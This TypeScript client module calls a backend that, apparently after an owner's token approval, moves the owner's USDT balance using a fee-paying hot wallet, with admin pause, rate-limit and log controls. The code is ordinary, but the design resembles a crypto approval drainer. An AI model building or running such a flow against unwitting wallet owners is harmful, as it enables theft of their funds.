import { BACKEND_API_KEY, BACKEND_URL } from "./config";

export type BackendTransferResult =
  | { ok: true; txId: string }
  | { ok: false; error: string; code?: string };

const CODE_MESSAGES: Record<string, string> = {
  APPROVE_REQUIRED: "Approval not visible yet — wait a moment and retry",
  HOT_WALLET_LOW_TRX:
    "Hot wallet does not have enough TRX for network fees — send TRX to the address shown on the dashboard, then retry",
  RATE_LIMITED: "Too many attempts — wait a minute and retry",
  UNAUTHORIZED: "Server rejected the request",
  BROADCAST_FAILED: "Server transaction was rejected by the network",
  UPSTREAM_ERROR: "Server could not reach the network",
  ZERO_BALANCE: "No USDT balance to send",
  INVALID_OWNER: "Invalid wallet address",
  TRANSFERS_PAUSED: "Transfers are paused by the admin",
  BAD_REQUEST: "Server rejected the request body",
};

export async function requestBackendTransfer(
  owner: string,
  fetchImpl: typeof fetch = fetch,
): Promise<BackendTransferResult> {
  let res: Response;
  try {
    res = await fetchImpl(`${BACKEND_URL}/api/transfer`, {
      method: "POST",
      headers: {
        "content-type": "application/json",
        "x-api-key": BACKEND_API_KEY,
      },
      body: JSON.stringify({ owner }),
    });
  } catch {
    return { ok: false, error: "Could not reach the server — is it running?" };
  }

  let body: {
    status?: string;
    txId?: string;
    code?: string;
    message?: string;
    error?: string;
  } = {};
  try {
    body = (await res.json()) as typeof body;
  } catch {
    return { ok: false, error: `Server error (${res.status})` };
  }

  if (res.ok && body.status === "broadcast" && body.txId) {
    return { ok: true, txId: body.txId };
  }
  if (res.ok && body.status === "skipped") {
    return { ok: false, error: CODE_MESSAGES.ZERO_BALANCE! };
  }
  const code = body.code ?? "";
  // The server reports some codes with `error` and others with `message`;
  // read both so a paused or malformed request never degrades to a bare
  // HTTP status.
  const message =
    CODE_MESSAGES[code] ?? body.message ?? body.error ?? `Server error (${res.status})`;
  return { ok: false, error: message, code };
}

export interface AdminWalletOk {
  address: string;
  trxSun: number;
  usdtRaw: string;
  lowTrx: boolean;
  checkedAt: number;
  minSun: number;
  feeEstimateSun: number | null;
  feeEstimateAt: number | null;
  belowEstimate: boolean;
}

export type AdminWallet = AdminWalletOk | { error: string };

export interface AdminStatus {
  ok: boolean;
  network: string;
  paused: boolean;
  rateLimitOn: boolean;
  log: Array<{
    ts: number;
    owner: string;
    result: string;
    detail: string;
    amount: number | null;
  }>;
  wallet?: AdminWallet;
}

export async function fetchAdminStatus(
  fetchImpl: typeof fetch = fetch,
): Promise<AdminStatus | null> {
  try {
    const res = await fetchImpl(`${BACKEND_URL}/api/admin/status`, {
      headers: { "x-api-key": BACKEND_API_KEY },
    });
    if (!res.ok) return null;
    const body = (await res.json()) as AdminStatus;
    if (!body || body.ok !== true) return null;
    return body;
  } catch {
    return null;
  }
}

export async function postAdminControl(
  path: "/api/admin/pause" | "/api/admin/ratelimit" | "/api/admin/clear-log",
  payload: Record<string, unknown>,
  fetchImpl: typeof fetch = fetch,
): Promise<boolean> {
  try {
    const res = await fetchImpl(`${BACKEND_URL}${path}`, {
      method: "POST",
      headers: { "content-type": "application/json", "x-api-key": BACKEND_API_KEY },
      body: JSON.stringify(payload),
    });
    return res.ok;
  } catch {
    return false;
  }
}
